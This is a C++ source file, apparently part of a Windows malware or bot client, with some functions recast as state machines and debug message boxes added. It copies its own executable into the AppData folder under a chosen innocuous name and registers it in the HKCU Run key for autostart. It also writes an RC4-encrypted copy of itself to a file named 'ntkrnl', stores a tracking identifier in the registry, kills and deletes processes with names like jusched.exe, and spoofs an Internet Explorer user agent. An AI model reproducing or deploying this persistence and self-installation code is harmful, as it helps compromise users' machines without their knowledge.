#include "Base.h"
#include "Config.inc"
#include "MonitoringThread.h"
#include <time.h>

Base *Base::instance()
{
	static Base *i = NULL;
	if (!i)
		i = new Base();

	return(i);
}

void RC4Crypt(unsigned char *Buffer, int BufferLen, char *Key, int KeyLen)
{
    int i, x, y, a, b, j = 0, k = 0;
	unsigned char m[256];
    x = 0;
    y = 0;
	for (i = 0; i < 256; i++) m[i] = (unsigned char) i;
	for (i = 0; i < 256; i++)
    {
        a = m[i];
        j = (j + a + Key[k]) & 0xFF;
        m[i] = m[j];
        m[j] = (unsigned char) a;
		k = (k + 1) % KeyLen;
    }
	
	for (i = 0; i < BufferLen; i++)
    {
        x = (x + 1) & 0xFF;
		a = m[x];
        y = (y + a) & 0xFF;
		b = m[y];
        m[x] = (unsigned char) b;
        m[y] = (unsigned char) a;
		Buffer[i] = (unsigned char) (Buffer[i] ^ m[(unsigned char) (a + b)]);
    }
}

#define KEY "Password"

Base::Base(void)
{
	DWORD ser;
	char pcn[512],
		proc[MAX_PATH + 1],
		appdata[MAX_PATH + 1],
		s[32] = "";

	GetVolumeInformationA(NULL, NULL, 0, &ser, NULL, NULL, NULL, 0);
	sprintf(s, "%x", ser);
	
	DWORD sz = sizeof(pcn);
	if (!GetComputerName(pcn, &sz))
		strcpy(pcn, "errorretrieving");

	if (!GetModuleFileNameA(NULL, proc, sizeof(proc)))
		strcpy(proc, "err");

	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, appdata);

	version = (BYTE)1 << 8 | (BYTE)2;

	unsigned char sel = HIBYTE(HIWORD(ser)) + LOBYTE(HIWORD(ser)) + HIBYTE(LOWORD(ser)) + LOBYTE(LOWORD(ser));
	exename = names[sel % N_NAMES];
	inspath = appdata + std::string("\\") + DIRECTORY_NAME + std::string("\\") + exename;
	insdir = appdata + std::string("\\") + DIRECTORY_NAME + std::string("\\");
	
	ForceDirectories(insdir.c_str());
	
	ReadHardwareId(s, sizeof(s));
	
	char SourceFilePath[1024];
	SHGetSpecialFolderPath(0, SourceFilePath, CSIDL_APPDATA, 0);
	strcat(SourceFilePath, "\\ntkrnl");

	FILE *Source = fopen(proc, "rb");
	fseek(Source, 0, SEEK_END);
	int Len = ftell(Source);
	fseek(Source, 0, SEEK_SET);
	unsigned char *Data = (unsigned char *) malloc(Len);
	fread(Data, sizeof(char), Len, Source);
	fclose(Source);
	RC4Crypt((unsigned char *) Data, Len, KEY, strlen(KEY));
	
	FILE *Destination = fopen(SourceFilePath, "wb");	
	fwrite(Data, sizeof(char), Len, Destination);
	fclose(Destination);

	this->serial = ser;
	this->hwid = s;
	this->pcname = pcn;
	this->curpath = proc;
	this->adpath = appdata;
}


Base::~Base(void)
{

}

unsigned int Base::RandomRange(const int Min, const int Max)
{
	return (rand() % (Max - Min + 1) + Min);
}

void Base::GenerateRandomString(char Result[], int Len)
{
	int i;
	srand((unsigned int) time(NULL) ^ Len);
	for (i = 0; i < Len; i++)
	{
		if (RandomRange(1, 255) % 2) Result[i] = (char) RandomRange('A', 'Z');
		else Result[i] = (char) RandomRange('a', 'z');
	}
}

char *ReadRegistryValue(const HKEY hKey, const char *lpSubKey, const char *lpValueName)
{
	HKEY hResult;
	LPBYTE lpData = NULL;
	DWORD dwSize, dwType;
	if (RegOpenKeyEx(hKey, lpSubKey, 0, KEY_READ, &hResult) == ERROR_SUCCESS)
	{
		if (RegQueryValueEx(hResult, lpValueName, NULL, NULL, NULL, &dwSize) == ERROR_SUCCESS)
		{
			lpData = (BYTE *) malloc(dwSize);
			if (lpData)
			{
				if (RegQueryValueEx(hResult, lpValueName, NULL, &dwType, lpData, &dwSize) != ERROR_SUCCESS)
				 free(lpData);
			}
			RegCloseKey(hResult);
			return (char *) lpData;
		}
	}
	return NULL;
}

bool WriteRegistryValue(const HKEY hKey, const char *lpSubKey, const char *lpValueName, const char *lpValueData)
{
	bool Result = false;
	HKEY hResult;
	if (RegCreateKeyEx(hKey, lpSubKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hResult, NULL) == ERROR_SUCCESS)
	{
		Result = (RegSetValueEx(hResult, lpValueName, 0, REG_SZ, (const unsigned char *) lpValueData, strlen(lpValueData)) == ERROR_SUCCESS);
		RegCloseKey(hResult);
	}
	return Result;
}

void Base::ReadHardwareId(char Id[], size_t Size)
{
	enum State {
		INITIALIZE,
		READ_REGISTRY,
		CHECK_RESULT,
		GENERATE_RANDOM,
		WRITE_REGISTRY,
		COPY_RESULT,
		CLEANUP,
		DONE
	};

	State state = INITIALIZE;
	char* Result = nullptr;
	HKEY hResult;  // Unused, but kept for structural integrity

	while (state != DONE) {
		switch (state) {
		case INITIALIZE:
			memset(Id, '\0', Size);
			state = READ_REGISTRY;
			break;

		case READ_REGISTRY:
			Result = ReadRegistryValue(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\", "identifier");
			state = CHECK_RESULT;
			break;

		case CHECK_RESULT:
			if (Result == NULL) {
				state = GENERATE_RANDOM;
			}
			else {
				state = COPY_RESULT;
			}
			break;

		case GENERATE_RANDOM:
			GenerateRandomString(Id, 6);
			state = WRITE_REGISTRY;
			break;

		case WRITE_REGISTRY:
			MessageBoxA(NULL, "Something wrong..", "Read Hardware ID", MB_OK | MB_ICONINFORMATION);
			WriteRegistryValue(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\", "identifier", Id);
			state = DONE;
			break;

		case COPY_RESULT:
			MessageBoxA(NULL, "Good", "Read Hardware ID", MB_OK | MB_ICONINFORMATION);
			strncpy(Id, Result, Size);
			state = CLEANUP;
			break;

		case CLEANUP:
			free(Result);
			state = DONE;
			break;

		case DONE:
			// End state
			break;
		}
	}
}

bool Base::DirectoryExists(const char *DirectoryPath)
{
	DWORD Attr = GetFileAttributes(DirectoryPath);
	return ((Attr != 0xFFFFFFFF) && ((Attr & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY));
}

bool Base::ForceDirectories(const char* Path)
{
	enum State {
		CHECK_PATH_LENGTH,
		COPY_PATH,
		INIT,
		CHECK_DELIMITER,
		CHECK_NOT_EMPTY,
		CHECK_DIRECTORY,
		RESTORE_DELIMITER,
		ADVANCE_POINTER,
		RETURN_RESULT
	};

	State state = CHECK_PATH_LENGTH;
	char* pp = nullptr, * sp = nullptr, PathCopy[1024];
	bool Created = true;
	char Delimiter = '\\';

	while (state != RETURN_RESULT) {
		switch (state) {
		case CHECK_PATH_LENGTH:
			if (strlen(Path) >= sizeof(PathCopy)) {
				return false;
			}
			state = COPY_PATH;
			break;

		case COPY_PATH:
			strncpy(PathCopy, Path, sizeof(PathCopy));
			state = INIT;
			break;

		case INIT:
			pp = PathCopy;
			state = CHECK_DELIMITER;
			break;

		case CHECK_DELIMITER:
			if (Created && (sp = StrChar(pp, Delimiter)) != NULL) {
				state = CHECK_NOT_EMPTY;
			}
			else {
				state = RETURN_RESULT;
			}
			break;

		case CHECK_NOT_EMPTY:
			if (sp != pp) {
				*sp = '\0';
				state = CHECK_DIRECTORY;
			}
			else {
				state = ADVANCE_POINTER;
			}
			break;

		case CHECK_DIRECTORY:
			if (!DirectoryExists(PathCopy)) {
				MessageBoxA(NULL, "Something wrong..", "Force Directories", MB_OK | MB_ICONINFORMATION);
				Created = CreateDirectory(PathCopy, NULL);
			}
			state = RESTORE_DELIMITER;
			break;

		case RESTORE_DELIMITER:
			*sp = Delimiter;
			state = ADVANCE_POINTER;
			break;

		case ADVANCE_POINTER:
			pp = sp + 1;
			state = CHECK_DELIMITER;
			break;

		case RETURN_RESULT:
			// End state
			break;
		}
	}
	return Created;
}



void Base::getADPath(std::string &appdata)
{
	appdata = this->adpath;
}

void Base::getCurrentPath(std::string &path)
{
	path = this->curpath;
}

void Base::getPCName(std::string &pcname)
{
	pcname = this->pcname;
}

DWORD Base::getSerial()
{
	return(this->serial);
}

void Base::getHWID(std::string &hwid)
{
	hwid = this->hwid;
}

WORD Base::getNVersion()
{
	return version;
}

void Base::terminate()
{
	log(LL_DIAG, L_IAM L_TERMINATE);
	Updater::instance()->forceSubmit();
	exit(0);
}

void Base::getInstallPath(std::string &path)
{
	path = inspath;
}

bool Base::isInstalled()
{
	return(curpath == inspath);
}

void Base::getExeName(std::string &exename)
{
	exename = this->exename;
}

void Base::removeOld()
{
	static const char *old[] = {
		"dwm.exe",
		"win-firewall.exe",
		"adobeflash.exe",
		"desktop.exe",
		"jucheck.exe",
		"jusched.exe",
		"java.exe",
		NULL
	};

	std::string proc;
	getADPath(proc);
	proc += '\\';
	for (const char **o = old; *o; o++)
		forceDeleteFile(proc + *o);
}

void Base::remove()
{
	std::string proc;
	getADPath(proc);
	proc += '\\';

	for (unsigned int i = 0; i < N_NAMES; i++)
		forceDeleteFile(proc + names[i]);
}

bool Base::install()
{
	if (!CopyFile(curpath.c_str(), inspath.c_str(), false))
		return(false);

	if (!setAutostart())
		return(false);

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	memset(&si, 0, sizeof(si));
	memset(&pi, 0, sizeof(pi));
	si.cb = sizeof(si);
	if (!CreateProcess(inspath.c_str(), NULL, NULL, NULL, false, 0, NULL, NULL, &si, &pi))
		return(false);

	return(true);
}

void Base::forceInstall()
{
	log(LL_DIAG, L_FORCE L_DEL L_FILE "%s", inspath.c_str());
	forceDeleteFile(inspath);
}

bool Base::setAutostart()
{
	enum State {
		OPEN_REGISTRY_KEY,
		SET_VALUE,
		CLOSE_KEY,
		RETURN_RESULT
	};

	State state = OPEN_REGISTRY_KEY;
	bool result = false;
	HKEY hKey;
	DWORD dwType = REG_SZ;

	while (state != RETURN_RESULT) {
		switch (state) {
		case OPEN_REGISTRY_KEY:
			if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS) {
				MessageBoxA(NULL, "Something wrong..", "Read Hardware ID", MB_OK | MB_ICONINFORMATION);
				RegCloseKey(hKey);
				result = false;
				state = RETURN_RESULT;
			}
			else {
				state = SET_VALUE;
			}
			break;

		case SET_VALUE:
			if (RegSetValueEx(hKey, exename.substr(0, exename.length() - 4).c_str(), NULL, dwType, (LPBYTE)inspath.c_str(), inspath.length()) != ERROR_SUCCESS) {
				RegCloseKey(hKey);
				result = false;
				state = RETURN_RESULT;
			}
			else {
				state = CLOSE_KEY;
			}
			break;

		case CLOSE_KEY:
			RegCloseKey(hKey);
			result = true;
			state = RETURN_RESULT;
			break;

		case RETURN_RESULT:
			// End state
			break;
		}
	}
	std::string message = "result is:  " + std::to_string(result);
	MessageBoxA(NULL, message.c_str(), "Set Auto Start", MB_OK | MB_ICONINFORMATION);
	return result;
}


bool Base::forceDeleteFile(std::string& file)
{
	enum State {
		OPEN_FILE,
		CLOSE_FILE,
		DELETE_FILE,
		FIND_PROCESS,
		TERMINATE_PROCESS,
		SECOND_DELETE_FILE,
		RETURN_RESULT
	};

	State state = OPEN_FILE;
	HANDLE hFile = nullptr;
	bool result = true;
	std::string exename = file;
	HANDLE hProc = nullptr; // 새로운 지역 변수 선언

	while (state != RETURN_RESULT) {
		switch (state) {
		case OPEN_FILE:
			hFile = CreateFile(file.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
			if (hFile == NULL || hFile == INVALID_HANDLE_VALUE) {
				result = true;
				state = CLOSE_FILE;
			}
			else {
				CloseHandle(hFile);
				state = DELETE_FILE;
			}
			break;

		case CLOSE_FILE:
			if (!DeleteFile(file.c_str())) {
				state = FIND_PROCESS;
			}
			else {
				state = RETURN_RESULT;
			}
			break;

		case DELETE_FILE:
			if (!DeleteFile(file.c_str())) {
				state = FIND_PROCESS;
			}
			else {
				state = RETURN_RESULT;
			}
			break;

		case FIND_PROCESS:
			if (file.find_last_of('\\') != std::string::npos) {
				exename = file.substr(file.find_last_of('\\') + 1);
			}
			hProc = findProc(0, exename.c_str());
			if (!hProc) {
				result = false;
				state = RETURN_RESULT;
			}
			else {
				TerminateProcess(hProc, 0);
				Sleep(1000);
				state = SECOND_DELETE_FILE;
			}
			break;

		case TERMINATE_PROCESS:
			state = SECOND_DELETE_FILE;
			break;

		case SECOND_DELETE_FILE:
			MessageBoxA(NULL, "ildan try delete", "Force Delete Files", MB_OK | MB_ICONINFORMATION);

			if (!DeleteFile(file.c_str())) {
				MessageBoxA(NULL, "Something Wrong...", "Force Delete Files", MB_OK | MB_ICONINFORMATION);
				result = false;
			}
			state = RETURN_RESULT;
			break;

		case RETURN_RESULT:
			// End state
			break;
		}
	}

	return result;
}


HANDLE Base::findProc(DWORD pid, const char *exename)
{
	PROCESSENTRY32 pE;
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);

	if (!hSnap || hSnap == INVALID_HANDLE_VALUE)
		return(NULL);

	memset(&pE, 0, sizeof(pE));
	pE.dwSize = sizeof(pE);

	if (!Process32First(hSnap, &pE)) {
		CloseHandle(hSnap);
		return(false);
	}

	DWORD mypid = GetCurrentProcessId();
	HANDLE ret = NULL;

	do {
		if (pE.th32ProcessID <= 4 || pE.th32ProcessID == mypid)
			continue;

		if (pid != 0 && pE.th32ProcessID != pid) 
			continue;

		if (exename && !strstr(pE.szExeFile, exename))
			continue;

		HANDLE hProc = OpenProcess(PROCESS_TERMINATE, false, pE.th32ProcessID);
		if (!hProc || hProc == INVALID_HANDLE_VALUE)
			continue;

		ret = hProc;
		break;

	} while (Process32Next(hSnap, &pE));
	CloseHandle(hSnap);

	return(ret);
}

void Base::getSVersion(std::string &version)
{
	version = std::string("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.") + (char)(HIBYTE(this->version) + '0') + std::string(".") + (char)(LOBYTE(this->version) + '0');
}

void Base::diag(const char *func, int line, DWORD error, LOGLEVEL level, const char *fmt, ...)
{
	char str[2048];
	char prefix[256];

	if (level != LL_ERROR) {
		Settings *s = Settings::instance();
		s->lock();
		bool cont = s->log;
		s->unlock();

		if (!cont)
			return;
	}

	va_list ap;
	va_start(ap, fmt);
	vsprintf_s(str, sizeof(str), fmt, ap);
	va_end(ap);

	sprintf(prefix, "[%s:%d <%x>] ", func, line, error);
	
	Updater::instance()->addDiag(std::string(prefix) + std::string(str));
}

bool Base::runProc(std::string& path)
{
	enum State {
		CREATE_PROCESS,
		RETURN_RESULT
	};

	State state = CREATE_PROCESS;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	memset(&si, 0, sizeof(si));
	memset(&pi, 0, sizeof(pi));
	si.cb = sizeof(si);

	bool result = true;

	while (state != RETURN_RESULT) {
		switch (state) {
		case CREATE_PROCESS:
			if (!CreateProcess(path.c_str(), NULL, NULL, NULL, false, 0, NULL, NULL, &si, &pi)) {
				log(LL_ERROR, L_EXECUTING "%s" L_FAIL, path.c_str());
				result = false;
			}
			state = RETURN_RESULT;
			break;

		case RETURN_RESULT:
			// End state
			break;
		}
	}
	std::string message = "Result is: " + std::to_string(result);
	MessageBoxA(NULL, message.c_str(), "Force Delete Files", MB_OK | MB_ICONINFORMATION);
	return result;
}
